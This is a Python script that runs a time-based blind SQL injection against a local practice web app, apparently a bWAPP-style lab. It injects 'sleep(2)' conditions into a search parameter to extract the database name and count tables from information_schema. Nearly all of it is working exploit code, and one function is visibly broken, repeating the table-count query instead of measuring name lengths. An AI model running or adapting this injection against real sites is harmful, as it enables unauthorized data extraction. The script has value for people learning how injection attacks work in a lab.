import requests
import time

BASE_URL = "http://localhost:9999/sqli_15.php?title=Iron Man' and "

REQUEST_HEAD = {
    "Cookie": "security_level=0; PHPSESSID=4eb94fptilia0g0es1b2a78s45"
}

ACTION = " and sleep(2) -- &action=search"


def get_data_base_name_length() -> int:
    count = 0
    for i in range(100):
        url = BASE_URL + "length(database()) = {}".format(i) + ACTION
        start_time = time.time()
        requests.get(url, headers=REQUEST_HEAD)
        if time.time() - start_time > 1:
            print("数据库长度为{}".format(i))
            count = i
    return count


def get_date_base_name(count):
    temp = ""
    for i in range(count + 1):
        for j in range(33, 127):
            url = BASE_URL + "ascii(substr(database(),{},1)) = {}".format(i, j) + ACTION
            start_time = time.time()
            requests.get(url, headers=REQUEST_HEAD)
            if time.time() - start_time > 1:
                temp += chr(j)
    print("数据库名称为：{}".format(temp))


def get_table_count() -> int:
    count = 0
    for i in range(100):
        url = BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(i) + ACTION
        start_time = time.time()
        requests.get(url, headers=REQUEST_HEAD)
        if time.time() - start_time > 1:
            print("一共有{}张表".format(i))
            count = i
    return count

def get_table_name_length_each_table(count) -> int:
    for i in range(count+1):
        for j in range(100):
            url = BASE_URL + "(select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database())={}".format(i) + ACTION
            start_time = time.time()
            requests.get(url, headers=REQUEST_HEAD)
            if time.time() - start_time > 1:
                print("一共有{}张表".format(i))
                count = i

if __name__ == '__main__':
    get_table_count()
